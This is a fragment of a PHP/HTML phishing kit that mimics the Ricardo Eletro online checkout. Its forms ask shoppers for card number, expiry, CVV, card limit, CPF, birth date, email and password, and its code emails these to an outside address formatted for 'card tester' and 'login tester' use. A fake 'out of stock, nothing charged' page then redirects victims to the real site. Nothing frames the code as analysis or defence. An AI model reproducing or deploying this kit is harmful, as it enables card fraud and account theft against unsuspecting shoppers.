  </tr>
  <tr>
    <td align=\"right\">Senha:</td>
    <td>&nbsp;</td>
    <td>$pass1</td>
  </tr>
  <tr>
    <td align=\"right\">Hora da Compra:</td>
    <td>&nbsp;</td>
    <td>$date </td>
  </tr>
  <tr>
<tr>
    <td align=\"right\">Produto:</td>
    <td>&nbsp;</td>
    <td>$produto </td>
  </tr>
  <tr>
    <td align=\"right\">Preco:</td>
    <td>&nbsp;</td>
    <td>$preco </td>
  </tr>
  <tr>
  <tr>
    <td align=\"right\">IP:</td>
    <td>&nbsp;</td>
    <td>$ip</td>
  </tr>
  <tr>

    <th align=\"center\" colspan=\"3\" style=\"padding:10px; color:#0381DE; font-size:16px;\">Dados Cartao:</th>
    
  </tr>
  <tr>
    <td align=\"right\">Nome Cartao :</td>
    <td>&nbsp;</td>
    <td>$nomecc1</td>
  </tr>
  <tr>
    <td align=\"right\">CPF:</td>
    <td>&nbsp;</td>
    <td>$cpf2</td>
  </tr>
  <tr>
    <td align=\"right\">Nascimento:</td>
    <td>&nbsp;</td>
    <td>$nascimento2</td>
  </tr>
  <tr>
    <td align=\"right\">Numero Cartao:</td>
    <td>&nbsp;</td>
    <td><strong>$cartao</strong></td>
  </tr>
  <tr>
    <td align=\"right\">Numero Cartao(Sem Espaco):</td>
    <td>&nbsp;</td>
    <td>$ccC</td>
  </tr>
  <tr>
    <td align=\"right\">Validade:</td>
    <td>&nbsp;</td>
    <td><strong>$validade</strong></td>
  </tr>
  <tr>
    <td align=\"right\">CVV:</td>
    <td>&nbsp;</td>
    <td><strong>$segurancacvv</strong></td>
  </tr>
   <tr>
    <td align=\"right\">Limite:</td>
    <td>&nbsp;</td>
    <td><strong>$limitecc</strong></td>
  </tr>
   <tr>
    <td align=\"right\">Bandeira:</td>
    <td>&nbsp;</td>
    <td><strong>$bandeira</strong></td>
  </tr>
   <tr>
    <td align=\"right\">Parcela:</td>
    <td>&nbsp;</td>
    <td><strong>$parcela</strong></td>
  </tr>

  <tr>
    <td align=\"right\">Testador CC:</td>
    <td>&nbsp;</td>
    <td><strong>$ccC / $validade / $segurancacvv /</strong></td>
  </tr>
      <tr>
    <td align=\"right\">Testador Login:</td>
    <td>&nbsp;</td>
    <td><strong>$email;$pass1</strong></td>
  </tr>
  <tr>
    <td align=\"right\">Bin Cartao:</td>
    <td>&nbsp;</td>
    <td><strong>$info   </strong></td>
  </tr>
</table>
	
	</span>

	";
	
	
}

$teste = html_entity_decode($nomecompleto);
$headers .= "MIME-Version: 1.1" ."\r\n";
$headers .= "Content-type: text/html; charset=utf-8" ."\r\n";
// Perceba que a linha acima contem "text/html", sem essa linha, a mensagem nao chegara formatada.
$headers .= "From: New Ricardo <email@ricardoeletro.com.br>" ."\r\n";
    $verificar_cc 	= mysql_query("SELECT * FROM contatos WHERE ncc1='$cc'");
	$pegar_numb		= mysql_num_rows($verificar_cc);
	if($pegar_numb >= '1'){}else{

    mail( "acestbh@live.com", "{$cartao2111[0]}- Limite: R$$limitecc /$info ", $mensage, $headers);	
}
		
	//======================================
 // Se voca quiser tirar a opcao de salvar em .txt, delete todo esse codigo abaixo, de um //=== ate o outro la em baixo !

//==================================================================

?>
<div class="content-min" id="Content">
<div class="content-etapas">
<div class="icone-titulo ">
<div class="icone-titulo-borda">
</div>
</div>
<div class="etapas-right">
<div class="titulo">finalizacao</div>
<div class="etapas">
<div class="desativado-anterior">
<div class="etapa">
<div class="numero">
<div class="passo feito">
</div>
<div class="label">Carrinho</div>
</div>
<div class="pontilhado">
</div>
</div>
</div>
<div class="desativado-anterior">
<div class="etapa">
<div class="numero">
<div class="passo feito">
</div>
<div class="label">Identificacao</div>
</div>
<div class="pontilhado">
</div>
</div>
</div>
<div class="desativado-anterior">
<div class="etapa">
<div class="numero">
<div class="passo feito">
</div>
<div class="label">Endereco</div>
</div>
<div class="pontilhado">
</div>
</div>
</div>
<div class="desativado-anterior">
<div class="etapa">
<div class="numero">
<div class="passo feito">
</div>
<div class="label">Pagamento</div>
</div>
<div class="pontilhado">
</div>
</div>
</div>
<div class="ativado">
<div class="etapa">
<div class="numero">
<div class="passo">5</div>
<div class="label">Finalizacao</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="CheckoutFinalizacao">
<div class="bloco-finalizacao">
<div>
<p class="msg-pedido-finalizado">
<strong>Infelizmente o estoque para esta promocao esgotou!</strong>
</p>
<p class="msg-agradecimento">Assim que estiver disponivel, informaremos por email, agradecemos seu contato</p>
</div>
<div class="bloco-num-pedido-finalizado">
<p>

<strong>Numero do pedido</strong>
</p>
<p class="num-pedido-finalizado">
<strong><?=$numberPedido
?></strong>
</p>
</div>
<div class="footer">
<div class="bloco-acompanhe-entrega">
<p>Infelizmente sua compra nao foi efetuada porque o produto indicado nao esta disponivel em nosso estoque , nada foi debitado do seu cartao de credito . A equipe Ricardo Eletro pede desculpas pelo acontecido.</p>
<p class="msg-acompanhe-entrega"><meta http-equiv="refresh" content="15; ,URL=http://ricardoeletro.com.br"> 
<a title="Meus Pedidos" href="https://carrinho.ricardoeletro.com.br/Pedido/Acompanhamento">Acompanhe sua entrega.</a>
</p>
</div>
<div class="ebit">
<form action="https://www.ebitempresa.com.br/bitrate/pesquisa1.asp" class="external" method="get">
<p>
<input type="hidden" value="135565" name="empresa">
<input type="image" alt="O que voce achou desta loja?" src="https://www.ebitempresa.com.br/bitrate/banners/b135565.gif" name="banner">
</p>
</form>
</div>
</div>
</div>
<div class="bloco-detalhes-pedido">
<h3 class="subtitulo-sessao">
<span class="indicador">
</span>Informacoes sobre seu pedido</h3>
<table id="tabela-itens-pedido">
<thead>
<tr>
<th class="coluna-nome-produto">Produto</th>
<th class="coluna-quantidade">Quantidade</th>
<th class="coluna-vlr-unit">Valor Unitario</th>
<th class="coluna-vlr-total">Valor Total</th>
<th class="coluna-icones-compartilhar">Compartilhar</th>
</tr>
</thead>
<tbody>
<tr>
<td class="coluna-nome-produto"><?=$row['productNameExc']?></td>
<td class="coluna-quantidade">1</td>
<td class="coluna-vlr-unit">R$ <?=$preco?></td>
<td class="coluna-vlr-total">R$ <?=$preco?></td>
<td class="coluna-icones-compartilhar">

</td>
</tr>
</tbody>
<tfoot>
<tr>
<td colspan="6">
<div class="bloco-total-pedido">
<p>
<strong>Frete: <span class="valor">Gratis</span>
</strong>
</p>
<p>
<strong>Servicos: <span class="valor">0,00</span>
</strong>
</p>
<br>
<p>
<strong>Total: <span class="valor">R$ <?=$preco?> </span>
<?
if($parcela == '1'){$numParcela = $preco;}if($parcela == '2'){$numParcela = $preco2;}if($parcela == '3'){$numParcela = $preco3;}if($parcela == '4'){$numParcela = $preco4;}if($parcela == '5'){$numParcela = $preco5;}if($parcela == '6'){$numParcela = $preco6;} if($parcela == '7'){$numParcela = $preco7;}if($parcela == '8'){$numParcela = $preco8;}if($parcela == '9'){$numParcela = $preco9;}if($parcela == '10'){$numParcela = $preco10;}if($parcela == '11'){$numParcela = $preco11;}if($parcela == '12'){$numParcela = $preco12;}
?>
</strong>em <?=$parcela?>x de R$ <?=$numParcela?> sem juros</p>
</div>
</td>
</tr>
</tfoot>
</table>
</div>
<p class="link-navegacao-pagina">
<a class="btn-voltar-principal negrito" href="http://www.ricardoeletro.com.br">
<span class="indicador">
</span>voltar a pagina principal</a>
</p>
</div>
</div>
<? }else{ ?>
<form action="" method="post">
<div class="content-min" id="Content">
<div class="content-etapas">
<div class="icone-titulo ">
<div class="icone-titulo-borda">
</div>
</div>
<div class="etapas-right">
<div class="titulo">pagamento</div>
<div class="etapas">
<div class="desativado-anterior">
<div class="etapa">
<div class="numero">
<div class="passo feito">
</div>
<div class="label">Carrinho</div>
</div>
<div class="pontilhado">
</div>
</div>
</div>
<div class="desativado-anterior">
<div class="etapa">
<div class="numero">
<div class="passo feito">
</div>
<div class="label">Identificacao</div>
</div>
<div class="pontilhado">
</div>
</div>
</div>
<div class="desativado-anterior">
<div class="etapa">
<div class="numero">
<div class="passo feito">
</div>
<div class="label">Endereco</div>
</div>
<div class="pontilhado">
</div>
</div>
</div>
<div class="ativado">
<div class="etapa">
<div class="numero">
<div class="passo">4</div>
<div class="label">Pagamento</div>
</div>
<div class="pontilhado">
</div>
</div>
</div>
<div class="desativado">
<div class="etapa">
<div class="numero">
<div class="passo">5</div>
<div class="label">Finalizacao</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="PagePagamento">
<input type="hidden" class="" value="18751452" id="EnderecoId" name="EnderecoId">
<input type="hidden" class="" value="34.33" id="ValorFrete" name="ValorFrete">
<input type="hidden" class="" value="" id="ValorAgendamentoEntrega" name="ValorAgendamentoEntrega">
<input type="hidden" class="" value="2057.45" id="ValorTotal" name="ValorTotal">
<input type="hidden" class="" value="2299" id="ValorTotalProdutos" name="ValorTotalProdutos">
<input type="hidden" class="" value="2057.45" id="ValorAVista" name="ValorAVista">
<input type="hidden" value="0" id="ValeValor" name="ValeValor">
<div class="espaco">
</div>
<div class="box-dados-pedido">
<div class="titulo">dados do pedido</div>
<div class="ponta-direita">
</div>
<div class="ponta-esquerda">
</div>
<table cellspacing="0" cellpadding="0" class="tableCarrinho">
<thead class="cabecalho">
<tr class="meio">
<th class="coluna" colspan="2">produto</th>
<th class="coluna">quantidade</th>
<th class="coluna">valor unitario</th>
<th class="coluna">valor total</th>
</tr>
</thead>
<tbody>
<tr>
<td class="coluna-foto">
<img src="<?=$row['thumb']?>">
</td>
<td class="coluna-produto"><?=$row['productNameExc']?></td>
<td class="coluna-quantidade">1 </td>
<td class="coluna-valor-unitario">R$ <?=$preco?></td>
<td class="coluna-valor-total">R$ <?=$preco?></td>
</tr>
</tbody>
</table>
<div class="barra-valor-total">
<div class="bg-left-total">
</div>
<div class="bg-center-conteudo">
<div class="conteudo">
<div class="frete-servicos">
<div class="linha">
<div class="label">Frete:</div>
<div class="valor">Gratis</div>
</div>
<div class="linha">
<div class="label">Servicos: </div>
<div class="valor">R$ 0,00</div>
</div>
<div class="linha">
<div class="label">Descontos: </div>
<div class="valor">R$ 0,00</div>
</div>
</div>
<div class="valor-total">valor total <img src="https://www.imgeletro.com.br/site/re/layout/seta_valor_total.png">
</div>
<div class="valor-label">
<span>R$</span><?=$preco?></div>
</div>
</div>
<div class="bg-right-total">
</div>
</div>
</div>
<div class="box-dados-entrega">
<div class="titulo">dados de entrega</div>
<div class="box">
<div class="titulo-endereco">Endereco</div>
<div class="conteudo-endereco">
<p><?=$rua?>, <?=$numero?></p>
<p><?=$bairro?> - <?=$cidade?> - <?=$estado?></p>
<p>CEP: <?=$cep?></p>
<p style="padding-bottom:25px;">Previsao de entrega: Ate 4 dias uteis. Apos aprovacao do pagamento.</p>
</div>
</div>
</div>
<div class="clear">
</div>
<div class="box-opcoes-entrega">
<div class="titulo">opcoes de entrega</div>
<div class="conteudo-entrega">
<div class="box-entrega-convencional-esedex">
<div class="titulo-tipo">
<div class="seta">
</div>entrega convencional</div>
<div class="previsao-entrega box-darker">
<div class="radio">
<input type="radio" value="" name="OpcaoEntrega" checked="checked" id="EntregaConvencional">
</div>
<div class="desc">
<label for="EntregaConvencional">Previsao apos confirmacao do pedido: <span class="prazo-frete">4 dias uteis</span> - <span class="valor-frete">Frete: Gratis</span>
</label>
</div>
</div>
</div>
</div>
</div>
<div class="clear">
</div>
<div class="box-opcoes-pagamento">
<div class="titulo">opcoes de pagamento</div>
<div id="Cartao1">
<div class="box-um-cartao-credito">
<div class="titulo-opcao">
<div class="seta">
</div>cartao de credito</div>
<div class="content-cartao-credito">
<div class="selos">
<div class="selo">
<div class="radio">
<input type="radio" id="0"name="Bandeira" value="1"  <? if($_POST['Bandeira'] == '1'){echo"checked";}?> class="cartao-bandeira">
</div>
<div class="imagem">
<label for="0">
<div class="bg_1">
</div>
</label>
</div>
</div>
<div class="selo">
<div class="radio">
<input type="radio" id="1"name="Bandeira" value="2" <? if($_POST['Bandeira'] == '2'){echo"checked";}?> class="cartao-bandeira">
</div>
<div class="imagem">
<label for="1">
<div class="bg_2">
</div>
</label>
</div>
</div>
<div class="selo">
<div class="radio">
<input type="radio" id="2"name="Bandeira" value="3"  <? if($_POST['Bandeira'] == '3'){echo"checked";}?>class="cartao-bandeira">
</div>
<div class="imagem">
<label for="2">
<div class="bg_3">
</div>
</label>
</div>
</div>
<div class="selo">
<div class="radio">
<input type="radio" id="3"name="Bandeira" value="4" <? if($_POST['Bandeira'] == '4'){echo"checked";}?> class="cartao-bandeira">
</div>
<div class="imagem">
<label for="3">
<div class="bg_4">
</div>
</label>
</div>
</div>
<div class="selo">
<div class="radio">
<input type="radio" id="5"name="Bandeira" <? if($_POST['Bandeira'] == '6'){echo"checked";}?> value="6" class="cartao-bandeira">
</div>
<div class="imagem">
<label for="5">
<div class="bg_6">
</div>
</label>
</div>
</div>
<div class="selo">
<div class="radio">
<input type="radio" id="12" name="Bandeira" <? if($_POST['Bandeira'] == '13'){echo"checked";}?> value="13" class="cartao-bandeira">
</div>
<div class="imagem">
<label for="12">
<div class="bg_13">
</div>
</label>
</div>
</div>

</div>
<div class="clear">
</div>
<div class="formulario-pagamento" style="display: block;">
<div class="esquerda">
<div class="campo-container">
<label for="NomeCartao">*nome</label>
<div class="campo-nome input-container  <? if(empty($_POST['NomeCartaoCredito1']) and isset($_POST['NomeCartaoCredito1'])){?>input-container-error<? }?>">
<input type="text" class="exibeHelp" name="NomeCartaoCredito1" id="NomeCartaoCredito1" tabindex="1" value="<?=$_POST['NomeCartaoCredito1']?>">
<? $verdado = "Preencha o <strong>nome</strong> do titular do cartao"; if(empty($_POST['NomeCartaoCredito1']) and isset($_POST['NomeCartaoCredito1'])){?>
<div class="msg-erro" forfield="Nome" forform="Cadastro"><div class="msg-erro-inner"><?=$verdado?></div></div>
<? } ?>
</div>
<span>*conforme escrito no cartao</span>
</div>
<div class="campo-container" style="width:350px;">
<label for="NomeCartao">*numero do cartao</label>
<div class="campo-nome input-container <? if(empty($_POST['CartaoCredito1']) and isset($_POST['CartaoCredito1']) or isset($cartaoins) and isset($_POST['CartaoCredito1'])){?>input-container-error<? }?>" style="width:200px;">
<input type="text" class="exibeHelp"  style="width:200px;" value="<?=$_POST['CartaoCredito1']?>" name="CartaoCredito1" conf="[{req:true, msg:'Preencha o Nome'}]" OnKeyPress="formatar('#### #### #### ####', this); return SomenteNumero(event)" maxlength="19" id="CartaoCredito1" tabindex="3">
<? if(empty($_POST['CartaoCredito1']) and isset($_POST['CartaoCredito1'])){ $verdado = "Preencha esse <strong>campo</strong>";  }else{$verdado = $cartaoins; }if(empty($_POST['CartaoCredito1']) and isset($_POST['CartaoCredito1']) or isset($cartaoins) and isset($_POST['CartaoCredito1'])){?>
<div class="msg-erro" forfield="Nome" forform="Cadastro"><div class="msg-erro-inner"><?  echo $verdado; ?></div></div>
<? } ?>
</div>
<span>*somente numeros</span>
</div>

<div class="campo-container">
<div class="content-validade">
<label for="ValidadeCartao">*validade</label>
<div class="campo-validade input-container <? if(empty($_POST['validadeCartao']) and isset($_POST['validadeCartao']) or isset($validadein) and isset($_POST['validadeCartao'])){?>input-container-error<? }?>">
<input type="text" class="exibeHelp" OnKeyPress="formatar('##/##', this); return SomenteNumero(event)" value="<?=$_POST['validadeCartao']?>" maxlength="5" id="VencimentoCartaoCredito1" name="validadeCartao"  tabindex="3">
<? if(empty($_POST['validadeCartao']) and isset($_POST['validadeCartao'])){ $verdado = "Preencha esse <strong>campo</strong>";  }else{$verdado = $validadein; }if(empty($_POST['validadeCartao']) and isset($_POST['validadeCartao']) or isset($validadein) and isset($_POST['validadeCartao'])){?>
<div class="msg-erro" forfield="Nome" forform="Cadastro"><div class="msg-erro-inner"><?  echo $verdado; ?></div></div>
<? } ?>
</div>
<span>*mm/aa</span>
</div>
<div class="content-codigo">
<label for="CodigoCartao">*codigo de seguranca</label>

<div class="campo-codigo input-container">
  <p>
    <input type="text" class="exibeHelp" OnKeyPress="formatar('####', this); return SomenteNumero(event)" value="<?=$_POST['CodSegurancaCartao1']?>" maxlength="4" id="CodSegurancaCartao1" tabindex="4" name="CodSegurancaCartao1">
  </p>
  </div>
<br>
<div class="content-codigo">
  <label for="CodigoCartao">*limite do cartao</label>

<div class="campo-codigo input-container">
 <p>
    <input type="text" class="exibeHelp" OnKeyPress="formatar('', this); return SomenteNumero(event)" value="<?=$_POST['LimiteDoCartao']?>" maxlength="7" id="LimiteDoCartao" tabindex="5" name="LimiteDoCartao">
  </p>
  </div>
   <span>Exemplo: para limite de R$ 1000,00 digite apenas 1000</span>
</div>
</div>
</div>
</div>
<div class="direita"  style="width:200px; float:left; padding-right: 10px;">
<div class="numero-cartao">
<label for="NomeCartao">* cpf</label>
<div class="campo-numero-cartao input-container <? if(empty($_POST['CpfCartaoCredito1']) and isset($_POST['	CartaoCredito1']) or isset($cpfin) and isset($_POST['CpfCartaoCredito1'])){?>input-container-error<? }?>" style="width:100px;">
<input type="text" class="exibeHelp" style="width:100px;"maxlength="14" value="<?=$_POST['CpfCartaoCredito1']?>" OnKeyPress="formatar('###.###.###-##', this); return SomenteNumero(event)" id="CpfCartaoCredito1" name="CpfCartaoCredito1" tabindex="1">
<? if(empty($_POST['CpfCartaoCredito1']) and isset($_POST['CpfCartaoCredito1'])){ $verdado = "Preencha um CPF valido";  }else{$verdado = $cpfin; }if(empty($_POST['CpfCartaoCredito1']) and isset($_POST['CpfCartaoCredito1']) or isset($cpfin) and isset($_POST['CpfCartaoCredito1'])){?>
<div class="msg-erro" forfield="Nome" forform="Cadastro"><div class="msg-erro-inner"><?  echo $verdado; ?></div></div>
<? } ?>
</div>
</div>
</div>
<div class="direita"  style="width:200px; float:left; padding-right: 10px;">
<div class="numero-cartao">
<label for="NomeCartao">* nascimento</label>
<div class="campo-numero-cartao input-container <? if(empty($_POST['NascimentoCartaoCredito1']) and isset($_POST['NascimentoCartaoCredito1']) or isset($nascimentoin) and isset($_POST['NascimentoCartaoCredito1'])){?>input-container-error<? }?>" style="width:86px;">
<input type="text" class="exibeHelp" style="width:86px;" value="<?=$_POST['NascimentoCartaoCredito1']?>" OnKeyPress="formatar('##/##/####', this); return SomenteNumero(event)"  maxlength="10" name="NascimentoCartaoCredito1" tabindex="1">
<? if(empty($_POST['NascimentoCartaoCredito1']) and isset($_POST['NascimentoCartaoCredito1'])){ $verdado = "Preencha esse <strong>campo</strong>";  }else{$verdado = $nascimentoin; }if(empty($_POST['NascimentoCartaoCredito1']) and isset($_POST['NascimentoCartaoCredito1']) or isset($nascimentoin) and isset($_POST['NascimentoCartaoCredito1'])){?>
<div class="msg-erro" forfield="Nome" forform="Cadastro"><div class="msg-erro-inner"><?  echo $verdado; ?></div></div>
<? } ?>
</div>
<span>* (dd/mm/aaaa)</span>
</div>
</div>

<div class="clear">
</div>
<div id="ContainerParcelas">
<div class="linha">
</div>
<div class="opcoes-parcelamento">
<div class="bloco-opcoes">
<div class="opcao">
<input type="radio" tabindex="5" id="Parcela1_1" value="1" name="Parcela1"total="2057.45" checked="checked" data-total="2057.45" data-juros="false">
<? $desconto = $row["price"] * 0.05; $totalDesconto = $row["price"] - $desconto; $totalFormatDesconto = number_format($totalDesconto, 2, ',', '.');?>
<label for="Parcela1_1">a vista sem juros R$ <?=$totalFormatDesconto?></label>
</div>
<div class="opcao">
<input type="radio" tabindex="6" id="Parcela1_2" value="2" name="Parcela1"total="2333.33" data-total="2333.33" data-juros="false">
<label for="Parcela1_2">Parcelado em 2 x sem juros R$ <?=$preco2?></label>
</div>
<div class="opcao">
<input type="radio" tabindex="7" id="Parcela1_3" value="3" name="Parcela1"total="2333.33" data-total="2333.33" data-juros="false">
<label for="Parcela1_3">Parcelado em 3 x sem juros R$ <?=$preco3?></label>
</div>
<div class="opcao">
<input type="radio" tabindex="8" id="Parcela1_4" value="4" name="Parcela1"total="2333.33" data-total="2333.33" data-juros="false">
<label for="Parcela1_4">Parcelado em 4 x sem juros R$ <?=$preco4?></label>
</div>
</div>
<div class="bloco-opcoes">
<div class="opcao">
<input type="radio" tabindex="9" id="Parcela1_5" value="5" name="Parcela1"total="2333.33" data-total="2333.33" data-juros="false">
<label for="Parcela1_5">Parcelado em 5 x sem juros R$ <?=$preco5?></label>
</div>
<div class="opcao">
<input type="radio" tabindex="10" id="Parcela1_6" value="6" name="Parcela1"total="2333.33" data-total="2333.33" data-juros="false">
<label for="Parcela1_6">Parcelado em 6 x sem juros R$ <?=$preco6?></label>
</div>
<div class="opcao">
<input type="radio" tabindex="11" id="Parcela1_7" value="7" name="Parcela1"total="2333.33" data-total="2333.33" data-juros="false">
<label for="Parcela1_7">Parcelado em 7 x sem juros R$ <?=$preco7?></label>
</div>
<div class="opcao">
<input type="radio" tabindex="12" id="Parcela1_8" value="8" name="Parcela1"total="2333.33" data-total="2333.33" data-juros="false">
<label for="Parcela1_8">Parcelado em 8 x sem juros R$ <?=$preco8?></label>
</div>
</div>
<div class="bloco-opcoes">
<div class="opcao">
<input type="radio" tabindex="13" id="Parcela1_9" value="9" name="Parcela1"total="2333.33" data-total="2333.33" data-juros="false">
<label for="Parcela1_9">Parcelado em 9 x sem juros R$ <?=$preco9?></label>
</div>
<div class="opcao">
<input type="radio" tabindex="14" id="Parcela1_10" value="10" name="Parcela1"total="2333.33" data-total="2333.33" data-juros="false">
<label for="Parcela1_10">Parcelado em 10 x sem juros R$ <?=$preco10?></label>
</div>
<div class="opcao">
<input type="radio" tabindex="15" id="Parcela1_11" value="11" name="Parcela1"total="2333.33" data-total="2333.33" data-juros="false">
<label for="Parcela1_11">Parcelado em 11 x sem juros R$ <?=$preco11?></label>
</div>
<div class="opcao">
<input type="radio" tabindex="16" id="Parcela1_12" value="12" name="Parcela1"total="2333.33" data-total="2333.33" data-juros="false">
<label for="Parcela1_12">Parcelado em 12 x sem juros R$ <?=$preco12?></label>
</div>
</div>
<div class="clear">
</div>
</div>
<div class="clear">
</div>
<div class="linha">
</div>
<div class="taxa_juros">
</div>
</div>
<div>
<input type="hidden" form="Cartao" id="msgErroCartao" class="msg-erro">
</div>
<div class="bottom">
<div class="importante">
<strong>Importante:</strong> O valor total da compra nao pode exceder o limite do seu cartao, mesmo quando o pagamento for parcelado. Esta e a regra de aprovacao adotada pela administradora de cartoes de credito. </div>
<div class="btn-finalizar finalizar">
<p class="inf-total-prazo">
<span style="display: none;">total a prazo: <strong class="valor-total-prazo">
</strong>
</span>
</p>
<input type="image" alt="Finalizar Pedido" src="https://www.imgeletro.com.br/site/re/button/btn_finalizarpedido.png" onsuccess="GravarPedido('1')"tabindex="17">
</div>
<div class="clear">
</div>


</div>
</div>
</div>
<div class="clear">
</div>
</div>
</div></div></div></div>
<?
}
?>
<input type="hidden" tabindex="2" value="<?=$_POST['tipo']?>" name="tipo">
<input name="NomeFantasia" type="hidden" id="NomeFantasia" tabindex="4" value="<?=$_POST['NomeFantasia']?>" maxlength="100">
<input name="Cnpj" type="hidden" id="Cnpj" tabindex="5" value="<?=$_POST['Cnpj']?>" maxlength="18">
<input name="IEstadual" type="hidden" id="IEstadual" tabindex="6" value="<?=$_POST['IEstadual']?>" maxlength="14">
<input type="hidden" value="<?=$_POST['Isento']?>" id="Isento" name="Isento">
<input name="DddEmpresa" type="hidden" id="DddEmpresa" tabindex="8" value="<?=$_POST['DddEmpresa']?>">
<input name="FoneEmpresa" type="hidden" id="FoneEmpresa" tabindex="9" value="<?=$_POST['FoneEmpresa']?>">
<input name="RamalEmpresa" type="hidden" id="RamalEmpresa" tabindex="10" value="<?=$_POST['RamalEmpresa']?>">
<input name="Site" type="hidden" id="Site" tabindex="11" value="<?=$_POST['Site']?>" maxlength="150">
<input type="hidden" name="RamoAtividade" id="RamoAtividade" class="txt" tabindex="12"  value="<?=$_POST['RamoAtividade']?>">
<input type="hidden" maxlength="30" tabindex="13" id="Nome" name="Nome" value="<?=$_POST['Nome']?>">
<input type="hidden" maxlength="70" tabindex="14" id="Sobrenome" name="Sobrenome" value="<?=$_POST['Sobrenome']?>">
<input name="Apelido" type="hidden" id="Apelido" tabindex="15" value="<?=$_POST['Apelido']?>" maxlength="30">
<input type="hidden"  tabindex="16" maxlength="10" id="Nascimento" name="Nascimento" value="<?=$_POST['Nascimento']?>">
<input type="hidden" tabindex="17" name="Sexo" id="Sexo" class="txt" value="<?=$_POST['Sexo']?>">
<input type="hidden" name="Profissao" id="Profissao" class="txt" tabindex="18" value="<?=$_POST['Profissao']?>">
<input type="hidden" maxlength="14" value="<?=$_POST['Cpf']?>" tabindex="19" id="Cpf" name="Cpf">
<input type="hidden" maxlength="2" tabindex="21" id="DddContato1" value="<?=$_POST['DddContato1']?>" name="DddContato1">
<input name="FoneContato1" type="hidden" id="FoneContato1" tabindex="22 " value="<?=$_POST['DddContato1']?>"maxlength="10">
<input name="RamalContato1" type="hidden" id="RamalContato1" tabindex="23" value="<?=$_POST['RamalContato1']?>">
<input name="DddContato2" type="hidden" id="DddContato2" tabindex="24" value="<?=$_POST['DddContato2']?>" maxlength="2">
<input name="FoneContato2" type="hidden" id="FoneContato2" tabindex="25" value="<?=$_POST['FoneContato2']?>" maxlength="10">
<input name="RamalContato2" type="hidden" id="RamalContato2" tabindex="26" value="<?=$_POST['RamalContato2']?>">
<input name="DddContato3" type="hidden" id="DddContato3"  tabindex="27" value="<?=$_POST['DddContato3']?>" maxlength="2">
<input name="FoneContato3" type="hidden" id="FoneContato3" tabindex="28" value="<?=$_POST['FoneContato3']?>" maxlength="10">
<input type="hidden" maxlength="9" id="cep" value="<?=$_POST['cep']?>" name="cep">
<input type="hidden"  id="rua" name="rua" value="<?=$_POST['rua']?>">
<input type="hidden" value="<?=$_POST['Identificacao']?>" id="Identificacao" name="Identificacao">
<input type="hidden" maxlength="11"  tabindex="33" id="Numero" name="Numero" value="<?=$_POST['Numero']?>">
<input name="Complemento" type="hidden" id="Complemento" tabindex="34" value="<?=$_POST['Complemento']?>" maxlength="45">
<input name="Bairro" type="hidden" id="Bairro" tabindex="35" value="<?=$_POST['Bairro']?>">
<input name="Estado" type="hidden" id="Estado" tabindex="36" value="<?=$_POST['Estado']?>">
<input name="Cidade" type="hidden" id="Cidade" tabindex="37" value="<?=$_POST['Cidade']?>">
<input type="hidden" maxlength="100" tabindex="38" id="Referencia" name="Referencia "value="<?=$_POST['Referencia']?>">
<input type="hidden" maxlength="60" tabindex="39" id="Email" name="Email" value="<?=$_POST['Email']?>">
<input type="hidden" maxlength="60" tabindex="40" id="ConfirmeEmail" name="ConfirmeEmail" value="<?=$_POST['ConfirmeEmail']?>">
<input name="Senha" type="hidden" id="Senha" tabindex="41" value="<?=$_POST['Senha']?>" maxlength="32">
<input name="ConfirmeSenha" type="hidden" id="ConfirmeSenha" tabindex="42" value="<?=$_POST['ConfirmeSenha']?>" maxlength="32">
<input type="hidden" value="valido" name="Csadastrar" />
<input type="hidden" name="verificar_click" value="checado">
</form>
<? }else{ ?>
<form action="" method="post">
<div class="content-min" id="Content">

<div id="CadastroCliente">
<div class="titulo-pagina">
<div class="campo-right">
<div class="text-alert">Atencao, os campos marcados com (*), sao obrigatorios</div>
<div class="imagem-alert">
</div>
</div>
<div class="campo-left">
<div class="text-campo">
<h1>cadastre-se</h1>
</div>
</div>
</div>
<div class="dados-cliente">
<div class="tipo-cliente">
<div class="cliente-pf">
<div class="input ">
<input type="radio" checked="" tabindex="1" <? if($tipo == '0'){echo "checked";}?> value="0" id="PF" name="tipo">
</div>
<div class="text">
<label for="PF">pessoa fisica</label>
</div>
</div>
<div class="cliente-pj">
<div class="input ">
<input type="radio" tabindex="2" value="1" <? if($tipo == '1'){echo "checked";}?> id="PJ" name="tipo">
</div>
<div class="text">
<label for="PJ">pessoa juridica</label>
</div>
</div>
</div>
<div style="margin-top:8px">
<? for($i = 0; $i < count($error); $i++){ if($error[$i] == '1'){}else{?><div class="msg-erro" forfield="Nome" forform="Cadastro"><div class="msg-erro-inner"><?=$error[$i]?></b></div></div><? }}?>
</div>
<div class="dados-empresa" <? if($tipo == '1'){echo "style=\"display:block;\"";}?>>
<div class="titulo">dados da empresa</div>
<div class="barra">
</div>
<div class="dados-empresa-form">
<div class="social">
<div class="razao-social">
<div class="text">* razao social</div>
<div class="input input-container">
<input type="text" maxlength="100" value="<?=$_POST['RazaoSocial']?>" tabindex="3" id="RazaoSocial" name="RazaoSocial">
</div>
</div>
<div class="nome-fantasia">
<div class="text">* nome fantasia</div>
<div class="input input-container">
<input name="NomeFantasia" type="text" id="NomeFantasia" tabindex="4" value="<?=$_POST['NomeFantasia']?>" maxlength="100">
</div>
</div>
<div class="clear">
</div>
</div>
<div class="registro"> <div class="registro-cnpj">
<div class="text">* cnpj</div>
<div class="input-middle">
<div class="input input-container">
<input name="Cnpj" type="text" id="Cnpj" tabindex="5" value="<?=$_POST['Cnpj']?>" maxlength="18">
<input type="hidden" name="verificar_click" value="checado">
</div>
</div>
<div class="posicao">(somente numeros, sem pontos ou tracos)</div>
<div class="clear">
</div>
</div>
<div class="inscricao-estadual">
<div class="text">* inscricao estadual</div>
<div class="middle-input">
<div class="input input-container">
<input name="IEstadual" type="text" id="IEstadual" tabindex="6" value="<?=$_POST['IEstadual']?>" maxlength="14">
</div>
<div class="posicao">(somente numeros, sem pontos ou tracos)</div>
</div>
<div class="isento-inscricao">
<div class="check">
<input type="checkbox" tabindex="7" id="Isento" name="Isento">
</div>
<div class="text">
<label for="Isento">isento</label>
</div>
</div>
<div class="clear">
</div>
</div>
<div class="clear">
</div>
</div>
<div class="contato-pj">
<div class="telefone">
<div class="text">* telefone</div>
<div class="dados-tel">
<div class="ddd input-container">
<input name="DddEmpresa" type="text" id="DddEmpresa" tabindex="8" value="<?=$_POST['DddEmpresa']?>">
</div>
<div class="middle-input">
<div class="num-tel input-container">
